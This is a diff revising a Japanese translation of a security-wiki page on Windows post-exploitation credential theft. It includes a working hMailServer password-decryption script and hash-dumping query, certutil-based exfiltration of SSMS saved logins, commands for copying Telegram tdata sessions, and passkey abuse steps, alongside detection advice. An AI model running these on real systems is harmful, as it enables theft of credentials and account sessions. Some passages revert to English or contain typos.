-* `DSRMAdminLogonBehavior=2` により、DC がオンラインの状態でも DSRM administrator がログオンできるようになり、攻撃者に別の組み込み high-privilege account が与えられる。
-* `RunAsPPL=0` は LSASS PPL protections を解除するため、LalsDumper などの dumper による memory access が容易になる。
 
-## hMailServer database credentials (post-compromise)
+* `DisableRestrictedAdmin=1` を設定すると、RDP 中の完全な credential/ticket 再利用が強制され、pass-the-hash 形式のピボットが可能になります。
+* `LocalAccountTokenFilterPolicy=1` は UAC token filtering を無効にするため、ローカル管理者はネットワーク経由で制限のない token を取得します。
+* `DSRMAdminLogonBehavior=2` により、DC がオンラインの間に DSRM administrator がログオンできるようになり、攻撃者にもう一つの組み込みの高権限アカウントを与えます。
+* `RunAsPPL=0` は LSASS PPL の保護を解除するため、LalsDumper などの dumper によるメモリーアクセスが容易になります。
 
-hMailServer は DB password を `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` の `[Database] Password=` の下に保存する。この値は static key `THIS_KEY_IS_NOT_SECRET` と 4-byte word endianness swaps を使用して Blowfish-encrypted されている。INI の hex string を次の Python snippet で使用する:<sup>[[2]](#references)</sup>
+## hMailServer の設定 credential（侵害後）
+
+インストール構成に応じて、`C:\Program Files\hMailServer\Bin\hMailServer.ini`、`C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`、`C:\ProgramData\hMailServer\hMailServer.ini` の正確な設定ファイルを確認してください。読み取り可能で空でない `[Security] AdministratorPassword=` の値は hMailServer の管理者パスワードハッシュであり、Windows Administrator のパスワードを示すものではありません。この credential を回収できた場合でも、Windows アカウントへのピボットには、パスワードの再利用とログオン権限を別途確認する必要があります。
+
+SQL CE データベースを使用するインストールでは、INI 内の別の `[Database] Password=` 値がデータベースを保護します。旧バージョンのインストールでは、この値は静的キー `THIS_KEY_IS_NOT_SECRET` と 4 バイト単位のエンディアン変換を使って Blowfish で暗号化されています。以下の Python snippet では、INI 内の hex string を使用します。<sup>[[2]](#references)</sup>
+
+まず、現在のアカウントが INI と対応する SQL CE `.sdf` データベースの**両方**を読み取れることを確認してください。INI のパスワードはデータベースを保護するものであり、データベース内に保存されている mailbox アカウントのハッシュとは別のものです。使用中のデータベースを調査またはアップグレードする際は、必ずその**コピー**を使用し、稼働中のファイルは使用しないでください。
+
 ```python
 from Crypto.Cipher import Blowfish
 import binascii
 
 def swap4(data):
-return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
+    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
 enc_hex = "HEX_FROM_HMAILSERVER_INI"
 enc = binascii.unhexlify(enc_hex)
 key = b"THIS_KEY_IS_NOT_SECRET"
 plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
 print(plain.decode())
 ```
-clear-text passwordを使用して、ファイルロックを回避するためにSQL CEデータベースをコピーし、32-bit providerを読み込み、必要に応じてアップグレードしてからハッシュをクエリします:
+
+平文パスワードを使ってファイルロックを避けるために SQL CE データベースをコピーし、32-bit provider を読み込み、必要に応じてアップグレードしてからハッシュを照会します。
+
 ```powershell
 Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
 Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
@@ -358,125 +417,140 @@ $engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
 $conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
 $cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
 ```
-`accountpassword` 列は hMailServer の hash format（hashcat mode `1421`）を使用します。これらの値を cracking すると、WinRM/SSH の pivot に再利用可能な credentials を取得できます。
+
+`accountpassword` 列では hMailServer の hash format（hashcat mode `1421`）が使用されています。解読されたメールボックスの password が Windows user pivot になるのは、その password がローカルまたはドメインのアカウントでも再利用されており、そのアカウントに必要なリモートログオン権限がある場合に限られます。
 
 ## LSA Logon Callback Interception (LsaApLogonUserEx2)
 
-一部の tooling は、LSA logon callback `LsaApLogonUserEx2` を intercept することで、**plaintext logon passwords** を取得します。これは、authentication package callback を hook または wrap し、credentials を **logon 中**（hashing 前）に取得してから、disk に書き込むか operator に返すという手法です。通常は、LSA に inject または register する helper として実装され、成功した各 interactive/network logon event の username、domain、password を記録します。<sup>[[1]](#references)</sup>
+一部のツールは、LSA logon callback `LsaApLogonUserEx2` を intercept することで**plaintext のログオン password**を取得します。認証 package callback を hook またはラップし、credentials を**ログオン中**（hash 化される前）に取得してから、ディスクに書き込むかオペレーターに返すという仕組みです。一般的には、LSA に inject または登録する helper として実装され、成功した対話型またはネットワークの各ログオンイベントについて、username、domain、password を記録します。<sup>[[1]](#references)</sup>
 
-Operational notes:
-- authentication path に helper を load するには、local admin/SYSTEM が必要です。
-- captured credentials は logon が発生した場合にのみ表示されます（hook に応じて、interactive、RDP、service、または network logon）。
+運用上の注意:
+- 認証経路に helper をロードするには、ローカル admin または SYSTEM 権限が必要です。
+- 取得される credentials は、ログオンが発生した場合にのみ確認できます（hook に応じて、対話型、RDP、service、またはネットワークログオン）。
 
-## SSMS Saved Connection Credentials (sqlstudio.bin)
+## SSMS の保存済み接続 credentials (sqlstudio.bin)
 
-SQL Server Management Studio (SSMS) は、saved connection information をユーザーごとの `sqlstudio.bin` ファイルに保存します。専用の dumpers はこのファイルを parse し、保存された SQL credentials を recover できます。command output のみを返す shell では、ファイルを Base64 として encode し、stdout に表示することで exfiltrate することがよくあります。<sup>[[1]](#references)</sup>
+SQL Server Management Studio (SSMS) は、保存済みの接続情報をユーザーごとの `sqlstudio.bin` ファイルに格納します。専用の dumper を使うと、ファイルを解析して保存済みの SQL credentials を復元できます。コマンド出力しか返さない shell では、ファイルを Base64 にエンコードして stdout に出力し、exfiltrate することがよくあります。<sup>[[1]](#references)</sup>
+
 ```cmd
 certutil -encode sqlstudio.bin sqlstudio.b64
 type sqlstudio.b64
 ```
-オペレーター側では、ファイルを再ビルドし、ローカルで dumper を実行して認証情報を復元します:
+
+オペレーター側でファイルを再ビルドし、ローカルでdumperを実行して認証情報を復元します。
+
 ```bash
 base64 -d sqlstudio.b64 > sqlstudio.bin
 ```
-## Telegram Desktop `tdata` session theft
 
-Telegram Desktop は認証情報とアカウントの状態を **`tdata`** ディレクトリに保持します。コピーしたセッションは、互換性のあるツールで読み込むことで、認証が有効な間はアカウントのパスワードなしで認証に使用できます。ローカルデータの暗号化が有効な場合、stealer にはパスコードも必要です。認証済みセッションからは、identity data、dialog および membership metadata、メッセージ、ダウンロード可能なメディアなどが露出する可能性があります。<sup>[[10]](#references)</sup>
+## Telegram Desktop `tdata` セッション窃取
 
-### Discovery and acquisition
+Telegram Desktop は、認証情報とアカウント状態を **`tdata`** ディレクトリに保持します。コピーしたセッションは、認証が有効な間、互換性のあるツールで読み込むことで、アカウントのパスワードなしに認証できます。ローカルデータの暗号化が有効な場合、stealer にはパスコードも必要です。認証済みセッションからは、ID情報、ダイアログやメンバーシップのメタデータ、メッセージ、ダウンロード可能なメディアにアクセスできます。<sup>[[10]](#references)</sup>
 
-インストール版と portable layout の両方を検索します。Microsoft Store の package name は異なるため、`TelegramMessenge` を含む package directory を列挙し、その `LocalCache\Roaming` subtree を調べます。<sup>[[10]](#references)</sup>
+### 検出と取得
+
+インストール版とポータブル版の両方の配置場所を検索してください。Microsoft Store のパッケージ名は異なるため、`TelegramMessenge` を含むパッケージディレクトリを列挙し、その `LocalCache\Roaming` サブツリーを調べます。<sup>[[10]](#references)</sup>
+
 ```powershell
 # Standard Telegram Desktop installation
 $env:APPDATA + '\Telegram Desktop\tdata'
 
 # Microsoft Store packages
 Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
-Where-Object Name -Like '*TelegramMessenge*' |
-ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }
+  Where-Object Name -Like '*TelegramMessenge*' |
+  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }
 
 # Portable/nonstandard copies (expensive and noisy)
 Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
 ```
-通常の読み取りに失敗し、プロセスの token に `SeBackupPrivilege` が**すでに含まれ、有効化されている**場合、backup-aware access がフォールバックとして機能します。これは privilege を取得したり、プロセスを elevate したりするものではありません。必要な token privileges が存在する場合、`FILE_FLAG_BACKUP_SEMANTICS` を指定した `CreateFileW` は backup/restore semantics を要求し、ファイルの security checks をオーバーライドできますが、この flag だけでは互換性のない sharing lock を回避できません。<sup>[[10]](#references)[[11]](#references)</sup>
 
-現在ロックされているファイルの場合は、**Volume Shadow Copy** を作成して読み取ります。ACL によってブロックされているファイルの場合、`robocopy /B` は backup mode を使用し、ファイルおよびディレクトリの ACL をオーバーライドします。<sup>[[10]](#references)[[12]](#references)</sup>
+通常の読み取りに失敗し、プロセストークンに `SeBackupPrivilege` が**すでに含まれ、有効化されている**場合、バックアップ対応アクセスが代替手段になります。この方法で特権を取得したり、プロセスを昇格させたりすることはできません。必要なトークン特権が存在すれば、`FILE_FLAG_BACKUP_SEMANTICS` を指定した `CreateFileW` でバックアップ／復元セマンティクスを要求し、ファイルのセキュリティチェックを回避できます。ただし、このフラグだけでは、互換性のない共有ロックを回避できません。<sup>[[10]](#references)[[11]](#references)</sup>
+
+使用中でロックされたファイルには **Volume Shadow Copy** を作成して読み取ります。ACLによってアクセスがブロックされたファイルには、`robocopy /B` がバックアップモードを使用し、ファイルおよびディレクトリのACLを回避します。<sup>[[10]](#references)[[12]](#references)</sup>
+
 ```cmd
 whoami /priv
 robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
 ```
-帯域幅を意識した implant は、まずファイルパスのインベントリだけを送信し、C2 によってすでに保存されているパスとスナップショット識別子を受け取り、不足しているファイルだけを upload する場合があります。そのため、再帰的な `tdata` 列挙後に行われる小規模な差分転送でも、セッション窃取が成功したことを示している可能性があります。<sup>[[10]](#references)</sup>
 
-### Detection and containment
+帯域幅を意識した implant は、まずファイルパスの一覧だけを送信し、C2 に保存済みのパスとスナップショット識別子を受け取り、不足しているファイルだけをアップロードすることがあります。そのため、再帰的な `tdata` の列挙後に少量の差分転送が行われていても、セッション窃取が成功している可能性があります。<sup>[[10]](#references)</sup>
 
-非Telegramプロセスによる `tdata` への再帰的アクセスを、`SeBackupPrivilege` の有効化、backup-semantics によるファイルオープン、VSS アクティビティ、または `/B` を使用する子 `robocopy.exe` と相関させます。また、`%APPDATA%` と `%LOCALAPPDATA%\Packages` の両方を短時間で列挙した後、同じプロセスから outbound connection が発生していないかも調査します。compromise 後は、**Settings → Devices**（または **Privacy & Security → Active Sessions**）を使用して認識できないセッションを終了します。two-step verification を有効にするだけでは、すでに盗まれた authorization は revoke されません。<sup>[[10]](#references)[[13]](#references)</sup>
+### 検知と封じ込め
 
-## Windows 上の Chrome からの Passkeys / WebAuthn credential theft
+Telegram 以外のプロセスによる `tdata` への再帰的なアクセスを、`SeBackupPrivilege` の有効化、backup-semantics を使ったファイルオープン、VSS のアクティビティ、または `/B` を指定して `robocopy.exe` を起動する子プロセスと関連付けて調査します。また、`%APPDATA%` と `%LOCALAPPDATA%\Packages` の両方を短時間で列挙した後、同じプロセスから外部接続が行われていないかも調べます。侵害後は、**設定 → デバイス**（または **プライバシーとセキュリティ → アクティブなセッション**）から、見覚えのないセッションを終了します。2 段階認証を有効にするだけでは、すでに盗まれた認証を無効化できません。<sup>[[10]](#references)[[13]](#references)</sup>
 
-**victim user** として Windows ホスト上で code execution を取得し、**Chrome + Google Password Manager synced passkeys** を使用している場合、passkeys は **admin/SYSTEM なし**でも興味深い post-exploitation target になります。<sup>[[4]](#references)</sup>
+## Windows 上の Chrome からの Passkeys / WebAuthn 認証情報窃取
+
+**被害ユーザー**として、**Chrome + Google Password Manager で同期された passkeys** を使用する Windows ホストでコード実行を取得した場合、**admin/SYSTEM 権限がなくても**、passkeys は興味深い post-exploitation の標的になります。<sup>[[4]](#references)</sup>
 
 ### 興味深いローカルアーティファクト
+
 ```text
 %LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
 %LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
 ```
-- **`Sync Data\LevelDB`** には、protobuf でエンコードされた **`WebauthnCredentialSpecifics`** レコードが保存されます。同一ユーザーのプロセスは、同期された passkeys の **RP ID**、**username**、**credential ID**、および暗号化された private-key のマテリアルを列挙できます。<sup>[[5]](#references)</sup>
-- **`passkey_enclave_state`** には、**`wrapped_identity_private_key`** や、同期された credentials の復元に使用されるラップ済みの秘密情報など、ローカルデバイスの enrollment state が保存されます。<sup>[[4]](#references)</sup>
 
-迅速なトリアージ:
+- **`Sync Data\LevelDB`** には、protobufでエンコードされた **`WebauthnCredentialSpecifics`** レコードが保存されています。同一ユーザーのプロセスは、同期されたpasskeyの **RP ID**、**ユーザー名**、**credential ID**、暗号化された秘密鍵のマテリアルを列挙できます。<sup>[[5]](#references)</sup>
+- **`passkey_enclave_state`** には、**`wrapped_identity_private_key`** や、同期されたcredentialの復元に使われるラップ済みシークレットなど、ローカルのデバイス登録状態が保存されています。<sup>[[4]](#references)</sup>
+
+簡易トリアージ:
+
 ```powershell
 Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
-Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
-Select-Object FullName, Length, LastWriteTime
+  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
+  Select-Object FullName, Length, LastWriteTime
 ```
-### TPM-bound key blobs can still be abused as a local signing oracle
 
-ブラウザーが TPM-backed identity key を **`NCRYPT_OPAQUE_KEY_BLOB`** としてエクスポートし、その blob をユーザーがアクセス可能な状態に保存している場合、malware は raw private key を抽出する必要がありません。単に **同じマシン** 上で blob を再インポートし、攻撃者が制御するデータへの署名をローカル TPM に要求できます:<sup>[[4]](#references)[[6]](#references)</sup>
+### TPMにバインドされたkey blobもローカル署名オラクルとして悪用できる
+
+ブラウザーがTPM-backed identity keyを**`NCRYPT_OPAQUE_KEY_BLOB`**としてエクスポートし、そのblobをユーザーがアクセス可能な領域に保存している場合、マルウェアはraw private keyを抽出する必要はありません。同じマシン上でblobを再インポートし、攻撃者が制御するデータへの署名をローカルTPMに要求するだけです:<sup>[[4]](#references)[[6]](#references)</sup>
+
 ```c
 NCryptOpenStorageProvider(...)
 NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
 NCryptSignHash(...)
 ```
-これは、**hardware binding によりデバイス外へのエクスポートは防止できるが、侵害されたエンドポイント上での同一ユーザーによる利用は防止できない**ことを意味します。
 
-### 実際の悪用経路
+This means **hardware binding prevents off-device export, but not use by the same user on the compromised endpoint**.
 
-1. **Pass-the-key / device-identity relay**<sup>[[4]](#references)</sup>
-- Chrome の LevelDB から `WebauthnCredentialSpecifics` を列挙する。
-- passkey login を開始し、新しい WebAuthn challenge を取得する。
-- 盗み出した `wrapped_identity_private_key` blob を被害者の TPM 上で使用し、cloud-authenticator request binding に署名する。
-- 返された assertion を relying party に relay する。
-- RP が `userVerification=preferred` を受け入れる場合や、**`UV=0`** の assertion を拒否しない場合に、特に有効である。
+### Practical abuse paths
+
+1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
+   - Chrome の LevelDB から `WebauthnCredentialSpecifics` を列挙する。
+   - passkey login を開始し、新しい WebAuthn challenge を取得する。
+   - 盗んだ `wrapped_identity_private_key` blob を被害者の TPM 上で使用し、cloud-authenticator request binding に署名する。
+   - 返された assertion を relying party に中継する。
+   - RP が `userVerification=preferred` を受け入れる場合や、**`UV=0`** の assertion を拒否しない場合に特に有効。
 2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
-- `passkey_enclave_state` を削除するか、有効な署名付き `device/forget` operation を送信して、再オンボーディングを強制する。
-- オンボーディング後もデバイスが **`uv_key_pending`** の状態にある場合、攻撃者が管理する UV public key を登録する。
-- provider が新しい UV key について attestation / secure-hardware origin を検証しない場合、その攻撃者の key による後続の署名は **`UV=1`** として扱われる。
+   - `passkey_enclave_state` を削除するか、有効な署名付き `device/forget` operation を送信して、再オンボーディングを強制する。
+   - オンボーディング後もデバイスが **`uv_key_pending`** 状態の場合、攻撃者が管理する UV public key を登録する。
+   - provider が新しい UV key の attestation / secure-hardware origin を検証しない場合、その後の攻撃者の鍵による署名は **`UV=1`** として扱われる。
 3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
-- recovery または rejoin を強制し、Chrome に synced-passkey master secret を取得させる。
-- `passkey_enclave_state` の再作成または変更を監視し、平文の **security domain secret (SDS)** が常駐している間に Chrome の memory を dump する。
-- 回収した SDS を使用して、すべての `WebauthnCredentialSpecifics` record 内の暗号化された field を復号し、portable WebAuthn private key を回収する。
+   - Chrome に synced-passkey master secret を取得させるため、recovery または rejoin を強制する。
+   - `passkey_enclave_state` の再作成や変更を監視し、平文の **security domain secret (SDS)** がメモリ上に存在する間に Chrome のメモリをダンプする。
+   - 復元した SDS を使って、すべての `WebauthnCredentialSpecifics` record の暗号化フィールドを復号し、持ち運び可能な WebAuthn private key を復元する。
 
 ### DFIR / detection ideas
 
-- **`passkey_enclave_state` の削除/再作成**を監視する。<sup>[[4]](#references)</sup>
-- browser 以外の process による Chrome **`Sync Data\LevelDB`** への異常なアクセスを alert する。
-- **Chrome memory dump** や、疑わしい cross-process memory access を alert する。
-- 繰り返される **Google Password Manager recovery PIN** prompt や、予期しない re-onboarding を調査する。
-- WebAuthn の **`signCount`** は synced passkey では一定のままになる可能性があるため、役に立たないことが多い点に注意する。したがって、従来型の clone detection は弱い。
+- `passkey_enclave_state` の**削除・再作成**を監視する。<sup>[[4]](#references)</sup>
+- ブラウザー以外のプロセスによる Chrome の **`Sync Data\LevelDB`** への異常なアクセスを検知する。
+- **Chrome のメモリダンプ**や、不審なプロセス間メモリアクセスを検知する。
+- **Google Password Manager recovery PIN** の繰り返し表示や、予期しない再オンボーディングを調査する。
+- WebAuthn の **`signCount`** は、synced passkey では一定のままの場合があり、役に立たないことが多い。そのため、従来型の clone detection は効果が弱い。
 
 ## References
 
-- [1] [Unit 42 – 高価値セクターを標的とした、何年にもわたって検知されなかった Operation の調査](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
-- [2] [0xdf – HTB/VulnLab JobTwo: SMTP 経由の Word VBA macro phishing → hMailServer credential decryption → Veeam CVE-2023-27532 による SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
-- [3] [Check Point Research – Inside Ink Dragon: relay network と stealthy offensive operation の内部構造を明らかにする](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
-- [4] [Unit 42 – Pass the Passkey: passwordless authentication における新たな attack surface](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
+- [1] [Unit 42 – 高価値セクターを標的とした、長年検知されなかった作戦の調査](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
+- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
+- [3] [Check Point Research – Ink Dragon の内側: リレーネットワークとステルス性の高い攻撃作戦の内部構造を明らかにする](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
+- [4] [Unit 42 – Pass the Passkey: パスワードレス認証における新たな攻撃対象領域](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
 - [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
 - [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
-- [7] [0xWord – Windows hacking: Microsoft のシステムと network への攻撃](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
-- [8] [Active Directory Data Store の実際の仕組み: NTDS.dit の内部 (Part 1)](https://blog.chrisse.se/?p=762)
-- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
-- [10] [Kaspersky Securelist – Armored Likho が Still toolkit により cyber-espionage arsenal を拡大](https://securelist.com/armored-likho-still-toolkit/121033)
-- [11] [Microsoft Learn – CreateFileW function と `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
+- [7] [0xWord – Windows ハッキング: Microsoft システムとネットワークへの攻撃](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
+- [8] [Active Directory のデータストアの実際の仕組み: NTDS.dit の内部 (第 1 部)](https://blog.chrisse.se/?p=762)
+- [9] [en.hackndo.com - リモートでの Lsass ダンプによるパスワード取得](https://en.hackndo.com/remote-lsass-dump-passwords)
+- [10] [Kaspersky Securelist – Armored Likho が Still Toolkit でサイバースパイ活動の手段を拡大](https://securelist.com/armored-likho-still-toolkit/121033)
+- [11] [Microsoft Learn – CreateFileW 関数と `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
 - [12] [Microsoft Learn – Robocopy `/B` backup mode](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
-- [13] [Telegram FAQ – active session の終了](https://telegram.org/faq)
+- [13] [Telegram FAQ – アクティブなセッションの終了](https://telegram.org/faq)
 {{#include ../../banners/hacktricks-training.md}}
